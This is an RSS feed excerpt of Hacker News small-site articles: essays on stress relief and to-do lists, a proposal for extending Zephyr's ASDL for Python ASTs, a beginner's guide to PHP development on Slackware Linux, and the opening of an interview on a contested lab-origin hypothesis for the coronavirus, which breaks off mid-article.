phenomenal book <a href="https://amzn.to/38v0jf9"><em>Spark: The Revolutionary New Science of Exercise and the Brain </em></a>, the author John J. Ratey, who’s an MD, talks about how simple physical actives like running, jogging, skipping can help us become not only fitter, but also happier and sharper.</p><p>In communities like No Lights No Lycra (NLNL), strangers gather to dance in the dark together, all sober, to shake the blues away. They are present in over 75 locations around the world, including Mumbai.</p><p>If you really want to move your body, you don’t have to go very far. Your home can become your stage. I personally, love to dance. Not that I’m a good dancer, but I love this as an activity to release inhibitions, move moods, and work up a sweat.</p><p>Few other activities that help you “feel better” are: sleep, humour, affection, meditation, allowing yourself a good old cry, or a primal scream.</p><p><a href="https://amzn.to/31Lb2Rh">Sleep</a> is essentially trauma and stress therapy, and I cannot “stress” more upon the importance of 8 hrs of daily sleep, no matter what.</p><p>If you are naturally humorous, it helps. If you are comfortable enough to crack bad jokes just to keep yourself entertained, it helps as well. Since we’re spending so much of time together after the lockdown, my girlfriend and I do this all the time. We crack silly jokes that others would find weird, childish, and sometimes even stupid. But this helps us deal with the day-to-day tribulations related to work and household chores.</p><p>A warm affectionate hug from your partner, your friend, or your parents is a great stress reliever. An affectionate hug essentially says, “You’re okay. You got it. It’s gonna be fine.” Hug more. Hug often.</p><p>If you’ve ever locked yourself in your room and sobbed for ten minutes or got on the top of a building and shouted your lungs out, and then at the end heaved a great big sigh and felt tremendously relieved, you have essentially helped yourself complete the stress response cycle.</p><p>Art, used in the same way, can help. My girlfriend’s sister does paintings in gouache. It started out as a hobby, but eventually it became a way discharge stress through the creative process. Journaling helps in similar ways. When mental health professionals suggest journaling or other expressive hobbies, they don’t mean that the construction of sentences or the task of drawing is inherently therapeutic, rather they are encouraging you to complete the cycle by pursuing little creative endeavours.</p><figure><img src="https://coffeeandjunk.com/content/images/2020/07/image.png"><figcaption>One of my girlfriend's sister's work</figcaption></figure><p>Don’t forget to treat yourself with affection during stressful times. I’ve known people for whom a hot shower and the rituals of painting their nails or doing their hair or putting on makeup fully transition them from a stressed-out state of mind to a warm, social state of mind.</p><p>These rituals and behaviours are forms of self-kindness. Apes eat insects out of each other’s fur. Bath bombs and body glitters are the modern human equivalent.</p><p>My point is, everybody has something that works—and everyone’s strategy is different. Whatever strategy you use, take deliberate steps to complete the cycle. Allow yourself to coast to the end without hitting the brake. As Emily Nagoski says, emotions are like tunnels; you have to walk all the way through the …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://coffeeandjunk.com/stress-response-cycle/">https://coffeeandjunk.com/stress-response-cycle/</a></em></p>]]>
            </description>
            <link>https://coffeeandjunk.com/stress-response-cycle/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738861</guid>
            <pubDate>Sun, 05 Jul 2020 14:21:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A few thoughts on the Zephyr's ASDL]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738815">thread link</a>) | @isidentical
<br/>
July 5, 2020 | https://tree.science/transitional-asdl.html | <a href="https://web.archive.org/web/*/https://tree.science/transitional-asdl.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      <p>The Zephyr Abstract Syntax Description Language or shortly Zephyr's ASDL is a 
well known; mature (released at 1997~), descriptive language for defining ASTs 
(nodes and leaves) and other tree-like data structures. When it got released (and
even after one or two decades) it was more than capable of being used in major compilers,
including CPython's bytecode compiler (from v2.5~). But after having quite a bit
of experience with it, I started to realize that it can be improved in a few ways.
The whole post will contain my own humble opinions. Please feel free share your
own ones with me through the contact information at the end of the post. I'm currently
working on a demo project to enpower all the ideas that are being mentioned below, and
it would be really nice to hear from you about these.</p>

<p>Every field declaration in ASDL consists from this form <code>[type][qualifier]? [name]</code>;
where <code>[type]</code> is either something defined in the current spec, or a built-in one 
(such as <code>identifier</code>). And the <code>[qualifier]</code> is a mutually exclusive and optional
qualifier for the given type. There are 2 kinds of qualifiers <code>[qualifier]={?, *}</code>.
A question mark (<code>?</code>) means it can be either empty or something that belongs to the
<code>[type]</code>. On the other side, a star (<code>*</code>) means it is a zero or more element sequence
of given <code>[type]</code>. In theory, these 2 qualifiers might seem enough, but giving a basic
example might prove the otherwise. Let's imagine a simple AST of a python function.</p>
<div><pre><span></span>function = Function(identifier name, expr? returns, stmt* body)
</pre></div>


<p>It has a name, an optional return annotation, and a list of statements as it's body.
Which looks very accurate, right?</p>
<div><pre><span></span><span>def</span> <span>foo</span><span>()</span> <span>-&gt;</span> <span>int</span><span>:</span>
    <span>pass</span>

<span>def</span> <span>bar</span><span>():</span>
    <span>pass</span>
    <span>pass</span>
</pre></div>


<p>If we try to address these functions in the AST which we created earlier, it will
look something like this;</p>
<div><pre><span></span><span>Function</span><span>(</span><span>"foo"</span><span>,</span> <span>Expr</span><span>(</span><span>int</span><span>),</span> <span>[</span><span>PassStmt</span><span>()])</span>
<span>Function</span><span>(</span><span>"bar"</span><span>,</span> <span>None</span><span>,</span> <span>[</span><span>PassStmt</span><span>(),</span> <span>PassStmt</span><span>()])</span>
</pre></div>


<p>And there is nothing that looks wrong with this form, as long as it is generated
by some kind of parser. But Python allows users to craft and compile arbitrary ASTs.
As you might know, the function bodies in Python have to at least 1 statement, but
the ASDL implies that it might have zero (since <code>*</code> means zero or more). There goes the
conflict, this AST, <code>Function("baz", None, [])</code> is valid according to the ASDL spec,
but it later on it might crash the interpreter or might not pass the validation at all.
For CPython, there is a custom AST validator, which comes with the burden of maintenance,
just for ensuring that user crafted AST's won't crash the compiler.</p>
<div><pre><span></span><span>&gt;&gt;&gt;</span> <span>import</span> <span>ast</span>
<span>&gt;&gt;&gt;</span> <span>foo_mod</span> <span>=</span> <span>ast</span><span>.</span><span>parse</span><span>(</span><span>"def foo(): pass"</span><span>)</span>
<span>&gt;&gt;&gt;</span> <span>foo_mod</span><span>.</span><span>body</span><span>[</span><span>0</span><span>]</span><span>.</span><span>body</span><span>.</span><span>clear</span><span>()</span>
<span>&gt;&gt;&gt;</span> <span>compile</span><span>(</span><span>foo_mod</span><span>,</span> <span>"&lt;test&gt;"</span><span>,</span> <span>"exec"</span><span>)</span>
<span>Traceback</span> <span>(</span><span>most</span> <span>recent</span> <span>call</span> <span>last</span><span>):</span>
  <span>File</span> <span>"&lt;stdin&gt;"</span><span>,</span> <span>line</span> <span>1</span><span>,</span> <span>in</span> <span>&lt;</span><span>module</span><span>&gt;</span>
<span>ValueError</span><span>:</span> <span>empty</span> <span>body</span> <span>on</span> <span>FunctionDef</span> <span>&lt;=</span> <span>custom</span> <span>error</span>
</pre></div>


<div><pre><span></span><span>static</span> <span>int</span>
<span>validate_nonempty_seq</span><span>(</span><span>asdl_seq</span> <span>*</span><span>seq</span><span>,</span> <span>const</span> <span>char</span> <span>*</span><span>what</span><span>,</span> <span>const</span> <span>char</span> <span>*</span><span>owner</span><span>)</span>
<span>{</span>
    <span>if</span> <span>(</span><span>asdl_seq_LEN</span><span>(</span><span>seq</span><span>))</span>
        <span>return</span> <span>1</span><span>;</span>
    <span>PyErr_Format</span><span>(</span><span>PyExc_ValueError</span><span>,</span> <span>"empty %s on %s"</span><span>,</span> <span>what</span><span>,</span> <span>owner</span><span>);</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
<span>static</span> <span>int</span>
<span>validate_body</span><span>(</span><span>asdl_seq</span> <span>*</span><span>body</span><span>,</span> <span>const</span> <span>char</span> <span>*</span><span>owner</span><span>)</span>
<span>{</span>
    <span>return</span> <span>validate_nonempty_seq</span><span>(</span><span>body</span><span>,</span> <span>"body"</span><span>,</span> <span>owner</span><span>);</span>
<span>}</span>
<span>...</span>
    <span>case</span> <span>FunctionDef_kind</span><span>:</span>
        <span>return</span> <span>validate_body</span><span>(</span><span>stmt</span><span>-&gt;</span><span>v</span><span>.</span><span>FunctionDef</span><span>.</span><span>body</span><span>,</span> <span>"FunctionDef"</span><span>)</span>
</pre></div>


<p>Also this is not the only case where the AST doesn't comply with ASDL. For an example,
the AST of an dictionary defined as <code>Dict(expr* keys, expr* values)</code>, which means that
it has two list of <em>expressions</em> that are named <code>keys</code> and <code>values</code>. That makes sense
since, AST of <code>{'a': 'b'}</code> is just <code>Dict([Constant('a')], [Constant('b')])</code>. But when it
comes to dict unpacking inside of another dictionary with double-star operator, the AST
looks like this;</p>
<div><pre><span></span>Input: {**a, b:c}
Output:
Dict(
    keys=[
        None,
        Name(id='b', ctx=Load()),
    ],
    values=[
        Name(id='a', ctx=Load()),
        Name(id='c', ctx=Load()),
    ],
)
</pre></div>


<p>Did you see that there is an outlier among the <code>keys</code>, the <code>None</code>. This is because that field
qualifiers are mutually exclusive, and you can't chain them. Things like this would make the
ASDL a context-dependent thing and in some cases, they might increase the maintenance burden
(such as external verifiers, which I'll also address in the next section). The solution would
be as simple as just extending the current qualifiers and make them chainable. There are 2 design
I have in my mind. The first one is introducing new qualifiers in the same form</p>
<div><pre><span></span>* =&gt; zero or more sequence
+ =&gt; one or more sequence
? =&gt; optional
[&lt;field type&gt;] =&gt; also optional but chainable

FunctionDef(identifier name, expr? returns, stmt+ body)
Dict([expr]* keys, expr* values)
</pre></div>


<p>the second one is kind-a different might be hard to process in big ASDL's but more explicit.</p>
<div><pre><span></span>ZeroOrMore[&lt;field type&gt;] =&gt; such as *
OneOrMore[&lt;field type&gt;] =&gt; such as +
Opt/Optional[&lt;field type&gt;] =&gt; such as * or [&lt;field type&gt;]

FunctionDef(identifier name, Opt[returns], OneOrMore[body])
Dict(ZeroOrMore[Opt[keys]], ZerOrMore[values])
</pre></div>



<p>Integrating some source code inside of grammars isn't a new idea, a recent example would be the
Python's new parser generator, and the <a href="https://github.com/python/cpython/blob/master/Grammar/python.gram">grammar</a>
it consumes. I believe that this can be integrated very quickly to the ASDL itself, with a new but not an unorthodox
syntax. The purpose of these actions is going to be both verification and transitions (not limited to that). 
It might open a way to language extensions.</p>
<p>Bringing such actions would require a metadata format to the ASDL modules, the best form I can think of is
something similar to python decorators that will annotate the ASDL modules (namespaces, which are not
part of the original <a href="https://everet.org/wp-content/uploads/2012/05/The-Zephyr-Abstract-Syntax-Description-Language.pdf">paper</a>).</p>
<div><pre><span></span>@&lt;key&gt; &lt;value&gt;
module &lt;name&gt; {}

@actions C
@version 3.8
module Example {}
</pre></div>


<p>The action syntax will depend on the action's purpose</p>
<div><pre><span></span>{verify, transition} $left::right [where $condition] {
    [ACTION]
}
</pre></div>


<h2>Verifier Actions</h2>
<p>As I mentioned earlier, languages that allow users to create external ASTs requires a custom
validation step. Type checking will help in most cases, but there will be still some esoteric
ones left. It might be a controversial thing since some people might not want to host their
source code inside of a text spec (I dont know, maybe for their linters / formatters, or other
purposes), but this will ensure that the validation process is public and the clients of this AST
will know what nodes will be validated and which kind of methods will be used for their validation.</p>
<div><pre><span></span>verify $nodes::$fields [where $condition] {
    [ACTION]
}

verify Dict::(keys, values) {
    return len(keys) == len(values)
}

verify ImportFrom::level {
    return level &gt;= 0
}

verify Try::(handlers, finalbody, orelse) where len(handlers) == 0 {
    if len(finalbody) == 0 and len(orelse) &gt; 0:
        return False
    ...
}
</pre></div>


<h2>Transitioning</h2>
<p>Here it comes the other big problem and a use case for actions, the AST changes. If you are writing some kind of tool that consumes the AST (e.g: linter), it is not uncommon for you to get broken
in every release. The reason for that is  AST is also an internal format and things might just change
for internal reasons and no one gives you a guarantee about it won't change again. So you have to test
your tool on every major release and ensure the breakages are gone by creating tons of workarounds.</p>
<p>This is the case for even the simplest change, like changing the name of a node. The solution would be
a simple layer of "compatibility". The way it should work is that, for old nodes, it is going to keep
the same structure as the old ASTs even though the name of the form of that node is changed. Achieving
such a thing would be available in 2 ways: keeping ASDL of every version (and it would be definitely a
mess), or only the generated code for that nodes as a part of that "compatibility" layer. I'd personally
go for the latter. Let's do an imaginary example of 3 different language versions;</p>
<div><pre><span></span>@version 3.6
module Example {
    number = NumOrFloat(object value)
           | Complex(object value)
}
</pre></div>


<div><pre><span></span>@version 3.7
module Example {
    number = Num(object value)
           | Float(object value)
           | Complex(object value)
</pre></div>


<div><pre><span></span>@version 3.8
module Example {
    number = Number(object value, str kind)
</pre></div>


<p>The <code>3.6</code> version has 2 nodes, <code>NumOrFloat</code> for numbers and floats and <code>Complex</code> for imaginary numbers.
The <code>3.7</code> form splits <code>NumOrFloat</code> into 2 different nodes, a <code>Num</code> node and a <code>Float</code> node. And finally,
the <code>3.8</code> version has only 1 constructor, it is the <code>Number</code>, with an additional <code>kind</code> field. In theory
that no matter which version you are, in the "compatibility" layer, you would only have the <code>NumOrFloat</code> and
the <code>Complex</code> nodes. For providing that we need some kind of action to do the transition. </p>
<div><pre><span></span>transition $source::$destination [where $condition] {
    [ACTION]
}

transition Number::(Num, Float, Complex) {
    switch (origin-&gt;kind) {
        case 'integer':
            return Num(origin-&gt;value);
        case 'float':
            return Float(origin-&gt;value);
        case 'complex':
            return Complex(origin-&gt;value);
    }
}
</pre></div>


<p>The example upper takes a <code>3.8</code> <code>Number</code> node and outputs a <code>3.7</code> node (<code>Num</code>, <code>Float</code>, or <code>Complex</code>). This is
also going to be the case for <code>3.7</code>, it will take a <code>3.7</code> AST and output a <code>3.6</code> version. So in the end, all ASTs
will be the same in the imaginary "compatibility" layer.</p>
<div><pre><span></span>@version 3.7
module Example {
    number = Num(object value)
           | Float(object value)
           | Complex(object value)

    transition Float::NumOrFloat {
        return NumOrFloat(origin-&gt;value);
    }
}
</pre></div>



<p>I guess this is all, thanks for reading this and if you have any extra thoughts about this, I really want to listen to
all of them. Please contact me through <code>isidentical [at] tree.science</code> or twitter/telegram/discord (<code>@isidentical</code>)</p>
    </div></div>]]>
            </description>
            <link>https://tree.science/transitional-asdl.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738815</guid>
            <pubDate>Sun, 05 Jul 2020 14:16:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Web Development on GNU/Linux]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738681">thread link</a>) | @zooboole
<br/>
July 5, 2020 | https://phpocean.com/tutorials/computer-skills/web-development-on-gnu-linux/69 | <a href="https://web.archive.org/web/*/https://phpocean.com/tutorials/computer-skills/web-development-on-gnu-linux/69">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>
                  Our website is made possible by displaying online advertisements to our visitors.
                  Please consider supporting us by disabling your ad blocker.
                </p>
              
              



              

              <p>There is a general concept that the nearer your web development environment is to your live web hosting environment the less the unexpected snags you will have to fix. The current usage of the Unix and Linux operating system for web servers is estimated as of 2020 at 67%.</p>

<p>So there is a very good chance that your web application will end up on a Linux OS server; you can increase that figure if you take into account Cloud technology which is primarily Linux.</p>

<p>This article looks at some of the nuances of using Linux for web development. I am of course biased in that I am a long time user of GNU/Linux particularly Slackware; currently, I maintain <a href="https://slackbuilds.org/repository/14.2/academic/latex2html/?search=latex2html" target="_blank">Latex2html</a> for the Slackware repository and contribute to <a href="https://docs.slackware.com/howtos:misc:anatomy_of_a_slackbuild" target="_blank">the Docs</a>.</p>

<p>I did use to use Windows for web stuff and it wasn't too bad in the old days when Windows Desktop as default was less cluttered. However generally I ended having to pay for third-party software such as CuteFTP. One day I built a new Desktop PC with a brand new blank hard drive. A blank hard drive with no OS! So it was decision time to pay for a Windows Install Disk, then have to pay for Office Suite or see what Linux can do.</p>

<p>I installed Linux and never looked back. As for CuteFTP I soon discovered there was a large repository where I could obtain the software free of Adverts, free of shareware and free of malware.</p>

<p>I mean it's hard enough coding and getting code bugs without throwing in, is that problem may be due to dodgy software I just installed?</p>

<p>When last in Ghana general comments to me were "why should I bother with that complicated Linux, when I can have Windows for free".</p>

<p>I don't buy that argument; if it was as simple as that why is not everybody in Ghana going from A to B on horses instead of cars. I mean a horse pretty much can do everything a car can, go uphill get you from A to B and only needs a bag of oats and a rub down!</p>

<p>It probably about decision and motivation. Let me just say I'm not here to judge and my air of superiority in using Slackware was recently given a knock and made me think from communication from <strong>Richard Stallman</strong> only last week.</p>

<blockquote>
  <p>Running an unauthorized copy of Windows still gives Microsoft power
  over you. So I say: an unauthorized copy of Windows is a very bad
  thing -- almost as bad as an authorized copy ;-{.</p>
  
  <p>Slackware GNU/Linux has two flaws. It contains nonfree programs. <a href="https://gnu.org/distros" target="_blank">See</a>
  <br> The developers call it "<strong>Slackware Linux</strong>"
  which is unfair to the GNU Project. <a href="https://gnu.org/gnu/linux-and-gnu.html">See</a>
   and <a href="https://gnu.org/gnu/gnu-linux-faq.html" target="_blank">this</a>, plus <a href="https://gnu.org/gnu/the-gnu-project.html" target="_blank">the history</a>.</p>
  
  <p><br> —  Dr. Richard Stallman</p>
</blockquote>

<p>So GNU/Linux Slackware is free as in free beer but not in terms of free in access to all of its code.</p>

<p>If you have only ever used Windows there will be a learning curve but there are choices on how fast you learn Linux. Things would be better if in 3rd World Countries such as Ghana they were serious in embracing Linux users and putting Linux onto the school Curriculum.</p>

<p>Some say Linux is complicated but more me I find it a more minimal experience especially using XFCE Desktop. I recently looked at a friend's laptop that was 30 gig and had Windows 10 on it. The hard drive was full but Windows wanted to do it said 2.8gig of updates. To be honest, how you can find your way around the system with all that clutter on the Desktop is beyond me!</p>

<p>The way I think about Linux is to use a car metaphor. Your Diesel car uses diesel and your petrol car, petrol. Apart from that, a driver uses his steering wheel, breaks, etc without a second thought about the engineering concept of the 4 stroke engine.</p>

<p>It's a bit like that in Linux. Once installed and you log in; you have at your disposal Firefox web browser and to all intents and purposes wouldn't know if you were on Linux or Windows.</p>

<p>All the other stuff like LibreOffice is available from the menu; the layout of LibreOffice is user-intuitive and you can save files as "doc".</p>

<p>Basically, the least complicated way is to use Linux as a normal user. In this case "file permissions" are set so that you will not be challenged.</p>

<p>On my Slackware GNU/Linux I have:</p>

<pre><code>bash-5.0$ php -v


PHP 7.4.1 (cli) (built: Dec 19 2019 00:29:31) ( ZTS )

Copyright (c) The PHP Group

Zend Engine v3.4.0, Copyright (c) Zend Technologies

with Zend OPcache v7.4.1, Copyright (c), by Zend Technologies

bash-5.0$
</code></pre>

<p>So with PHP 7.4.1 that's quite adequate to work for say CodeIgniter 4 or Symfony.</p>

<p>Since around 5.5 PHP came with its dev server you can simply do PHP development on your Desktop.</p>

<p>If for instance I download and unzip the latest CodeIgniter, cd into it and run this command:</p>

<pre><code>bash-5.0$ php spark serve

CodeIgniter CLI Tool - Version 4.0.3 - Server-Time: 2020-07-03 06:08:42am

CodeIgniter development server started on `http://localhost:8080`
</code></pre>

<p>Press Control-C to stop.</p>

<pre><code>[Fri Jul 3 12:08:42 2020] PHP 7.4.1 Development Server (http://localhost:8080) started
</code></pre>

<p>I am up and running and can see the landing page at <code>http://localhost:8080</code></p>

<p><img src="https://phpocean.com/assets/images/forum-uploads/de56d459c998c14d57b76a3c4a12d5e0.png" alt="PHP Development server"></p>

<p>As I previously said its best to develop in as near to as your live environment will be so maybe apache might be more appropriate. Also, MySQL needs a database server so you can't use MySQL with the above method but what you can do is easily use sqlite3.</p>

<p>I have a few projects I'm working on and one risk leaving things on the Desktop is that they are easily likely to be wiped.</p>

<p>Developing PHP on Linux in the apache web server is not that complicated; I have it set up so that each project has its own directory located at var/www/htdocs</p>

<blockquote>
  <p>|- htdocs</p>
  
  <p>|-- CI</p>
  
  <p>|-- gbn</p>
  
  <p>|-- ginabrookes</p>
  
  <p>|-- ginbrookes</p>
  
  <p>|-- index.php</p>
  
  <p>|-- mysymfony</p>
</blockquote>

<p>I access via a web page and via a set up using <code>httpd-vhosts.conf</code> file.</p>

<p>Basically, I give each project a different Local host address so that I can directly access each project</p>

<p>such as :</p>

<pre><code>127.0.0.2

127.0.0.3
</code></pre>

<p>In <code>httpd-vhosts.conf</code> file, I could do:</p>

<pre><code>&lt;VirtualHost 127.0.0.7:80&gt;

ServerName ginabrookes.com

ServerAlias www.ginabrookes.com

DocumentRoot "/var/www/htdocs/ginabrookes/public"

&lt;Directory "/var/www/htdocs/ginabrookes/public&gt;

Order allow, deny

Allow from All

AllowOverride All

Require all granted

&lt;/Directory&gt;

&lt;/VirtualHost&gt;
</code></pre>

<p>Or by editing I can use a domain name in the web address bar by matching IP to a name.</p>

<h3>For loopbacking.</h3>

<pre><code>127.0.0.1 localhost

127.0.0.1 darkstar.citreon.org darkstar

127.0.0.2 CI.org

127.0.0.6 ginbrookes.com

127.0.0.7 ginabrookes.com
End of hosts.
</code></pre>

<p>There are some quirks to editing the development code since files within the system that are not in your usual userspace come under root or apache.</p>

<p>Maybe I can address that at another time.</p>

<p>When you first use Linux as a "normal" user; it's not so bad; everything
is there from the menu such as Firefox and generally everything works no problem. You can create documents, open them later, and edit - no problem. Everything is fine in your "normal user space".</p>

<p>Then one day like being in some old mansion you get inquisitive and start to look into other areas, but you find all the doors locked. You try to do something and get a "permission denied" you start feeling like your under "house arrest" and maybe a panic attack coming on.</p>

<p>Well, that's one way of looking at it. Basically, everything outside your normal userspace comes under <code>root</code> or other labels.</p>

<p>Apache webserver is located in the central system, not in your user
space; this is probably one of the main bugs bears Windows users will
have.</p>

<p>If you have a PHP framework inside at directory say called my "mydev",
located at <code>/var/www/htdocs/mydev</code> then you are going to get a shock 
when you open up say a PHP class and edit something- you can't do it
because you don't have permission to do so.</p>

<p>In a nutshell, Linux is a multi-user system; it's designed so that users
don't wander into unknown territory and mess up the whole system.</p>

<p>So if you have web dev in Apache web server and can't edit the code
then how do you get around it?</p>

<p>Well if you look in <code>/etc/httpd/httpd.conf</code> you will find what Apache
runs as in terms of who owns it and under whose permission it runs
under.</p>

<p>Generally, you should see :</p>

<pre><code>user: Apache
group: Apache
</code></pre>

<p>So maybe your know thinking "oh I see it's like one of those poncy
exclusive golf clubs" - I can't get in unless I'm a member!</p>

<p>Sort of.</p>

<p>So say your user name is "andrew" how does andrew get into the
exclusive "apache" club? well, you can run this command:</p>

<pre><code># usermod -a -G apache andrew
</code></pre>

<p>That code will keep all the existing groups andrew belongs to but also, add andrew to the "apache" group.</p>

<p>To make sure your "mydev" is set up
you can run:</p>

<pre><code>bash-5.0# chown apache:apache mydev -R
bash-5.0# chmod 775 mydev -R
</code></pre>

<p>What <code>chmod 775</code> means is that the owner can read, write and execute and the group can do the same - that means that since user Andrew belongs to the Apache group he can now edit code no problem.</p>

<p>The 5 at the end of 775 means everybody else but owner and group. They can read the code, run it but they can't change the code.</p>

<p>Linux permission is a subject in itself. Of course, all this seems
complicated but just like some club that does car mechanics
if you have some guiding hand at a Linux group, it will all be clear.</p>

<p>Apart from maybe seeming complex to start with, Linux has benefits and
features:</p>

<p>It's a very robust system that can cope with erratic "dumsor" in Ghana
generally, you don't have to worry about viruses. There is an Aladdin's cave of software you can add to your system free.</p>

<p>Unlike Windows where you have the choice of either cloned and
very likely insecure system or pay every two years for a new OS; you can
upgrade your Linux system.</p>

<p>Once you get into Linux, then open software is at your door.
Then a brave new world beckons of getting involved with others on coding projects.</p>

<p>Also with Linux, you can …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://phpocean.com/tutorials/computer-skills/web-development-on-gnu-linux/69">https://phpocean.com/tutorials/computer-skills/web-development-on-gnu-linux/69</a></em></p>]]>
            </description>
            <link>https://phpocean.com/tutorials/computer-skills/web-development-on-gnu-linux/69</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738681</guid>
            <pubDate>Sun, 05 Jul 2020 13:58:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lost in Transition: How I'm Fixing My To-Do List]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23738567">thread link</a>) | @dickiebush
<br/>
July 5, 2020 | https://www.dickiebush.com/articles/lost-in-transition-todo-list | <a href="https://web.archive.org/web/*/https://www.dickiebush.com/articles/lost-in-transition-todo-list">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="44" id="block-cf6e5a3f19c5dee8c56a"><div><p>I love a crisp to-do list.</p>
<p>Cracking open my notebook, I'm greeted by the column of unchecked boxes set the night before. I’m motivated by the potential for a day well-spent.</p>
<p>"Today's the day I get it all done," I say.</p>
<p>The morning always starts well. Coffee in-hand, I dive head-first into the first task with excitement. Because it's at the top of the list, it always gets done.</p>
<p>It's after this first checkmark goes into my notebook that my day starts to wobble. The rest of the day whizzes by in a blur. As the day comes to a close, the list of unchecked boxes glares back at me.</p>
<p>I've been thinking more about why this happens. And what I've found is single tasks get are easy to do. It's the transition between tasks when things start to crumble.</p>
<p>If I was able to check a box and move onto the next one, I would get through my list every time.</p>
<p>But checking a box usually comes with a break. And that breaks leads me to Twitter. And Twitter can lead me anywhere. </p>
<p>Before I know it, I'm lost in transition.</p>

<p>I lose myself in transition for three reasons:</p>
<ol>
<li>The next to-do is vague</li>
<li>The next to-do uses a different kind of thinking</li>
<li>The list itself is too long</li>
</ol>
<p>When the next task is vague, it can be intimidating. So I've started being very specific with the exact action that gets the task started.</p>
<p>Instead of "☐ Write Blog Post" I scribble "☐ Open Notion and Brainstorm Three Sentence Ideas."</p>
<p>When the next task uses a different kind of thinking, there is a high start-up cost. Switching from programming to writing looks doable on paper, but never works out in practice.</p>
<p>So I've started grouping together tasks which require the same way of thinking. I then structure my day around these groups, slotting the tasks accordingly. I'm most creative and productive early in the morning, but more thoughtful and analytical in the afternoon. When I'm through my morning creative tasks, I'll take a long walk and get ready for the analytical part of my day.</p>
<p>Finally, when the list is too long, I sometimes give up entirely. There are few more ambitious people than my 9 PM self setting my intentions for the next day. So recently I've started splitting my list into two lists — a "have-to-do" and a "nice-to-do."</p>
<p>The "have-to-do" is always shorter than the "nice-to-do." As long I check off each of the "have-to-dos," I feel good at the end of the day. Anything from the "nice-to-do" is just bonus points.</p>
<p>The last thing I'm doing when my list is too long is to simply shorten it. I look the list up and down, find the two lowest leverage tasks, and cross them out. It always pains me to do this, but I know it's the right thing to do. </p>

<p>We all want to get more done. If you experience similar feelings about your to-do list, give these tactics a try. The subtle changes have made me more effective and leave me closing each day a bit more fulfilled.</p>
</div></div></div>]]>
            </description>
            <link>https://www.dickiebush.com/articles/lost-in-transition-todo-list</link>
            <guid isPermaLink="false">hacker-news-small-sites-23738567</guid>
            <pubDate>Sun, 05 Jul 2020 13:41:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The most logical explanation is that it comes from a laboratory]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 18 (<a href="https://news.ycombinator.com/item?id=23738545">thread link</a>) | @markdog12
<br/>
July 5, 2020 | https://www.minervanett.no/corona/the-most-logical-explanation-is-that-it-comes-from-a-laboratory/361860 | <a href="https://web.archive.org/web/*/https://www.minervanett.no/corona/the-most-logical-explanation-is-that-it-comes-from-a-laboratory/361860">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

            <section>

                
                <div>

    

            <h2>NYHET</h2>



        

        

            <h3 itemprop="description">
            The well-known Norwegian virologist Birger Sørensen and his colleagues have examined the corona virus. They believe it has certain properties which would not evolve naturally. These conclusions are politically controversial, but in this interview he shares the findings behind the headlines.
            </h3>

    

</div>


                <div><p>“I understand that this is controversial, but the public has a legitimate need to know, and it is important that it is possible to freely discuss alternate hypotheses on how the virus originated” Birger Sørensen starts to explain when Minerva visits him in his office one morning in Oslo.</p><p>Despite the explosiveness of his statements and research, Sørensen remains calm and collected.</p><p>Sørensen has been a point of controversy ever since former MI6 director Richard Dearlove cited a yet to be published article by Sørensen and his colleagues in an interview with The Daily Telegraph. The article claims that the virus that causes Covid-19 most likely has not emerged naturally.</p><p>“It’s a shame that there has already been so much talk about this, because I have yet to publish the article where I put forward my analysis”, Sørensen says in the form of an exasperated sigh.</p><p>Together with his colleagues, Angus Dalgleish and Andres Susrud have authored an article that looks into the most plausible explanations regarding the origins of the novel coronavirus. The article builds upon an already published article in the Quarterly Review of Biophysics that describes newly discovered properties in the virus spike protein. The authors are still in dialogue with scientific journals regarding an upcoming publication of the article.</p><p>News outlets are thus confronted with a difficult question: Are the findings and arguments Sørensen and his colleagues put forward of a sufficiently high quality to be presented and discussed in the public sphere? Sørensen explains that they in their dialogue with scientific journals are encountering a certain reluctance to publishing the article – without, however, proper scientific objections. Minerva has read a draft of the article, and has after an overall assessment decided that the findings and arguments do deserve public debate, and that this discussion cannot depend entirely on the publication process of scientific journals.</p><p>In this interview with Minerva, Sørensen therefore puts forward his hypothesis on why it is highly unlikely that the coronavirus emerged naturally.</p><p>On May 18th, WHO decided to conduct an inquiry into the coronavirus epidemic in China. Sørensen believes that it is important that this inquiry looks into new and alternate explanations for how the virus originated, beyond the already well-known suggestion that the virus originated in the Wuhan Seafood Market.</p><p>“There are very few who still believe that the epidemic started there, so as of today we have no good answers on how the epidemic started. Then we must also dare to look at more controversial, alternative explanations for the origin,” Sørensen says.</p><p>Birger Sørensen and one of his co-authors, Angus Dalgleish, are already known as HIV researchers par excellence.</p><p>In 2008, Sørensen’s work came to international <a href="https://www.dagensperspektiv.no/2008/norsk-firma-med-hiv-gjennombrudd">attention</a> when he launched a new immunotherapy for HIV. <a href="https://www.nature.com/search?author=%22Angus%20G.+Dalgleish%22">Angus Dalgleish</a> is the professor at St. George’s Medical School in London who became world famous in 1984 after having <a href="https://www.nature.com/articles/312763a0">discovered</a> a novel receptor that the HIV virus uses to enter human cells.</p><p>The purpose of the work Sørensen and his colleagues have done on the novel coronavirus, has been to produce a vaccine. And they have taken their experience in trialling HIV vaccines with them to analyse the coronavirus more thoroughly, in order to make a vaccine that can protect against Covid-19 without major side effects.</p><h2>Exceptionally well adjusted</h2><p>“The 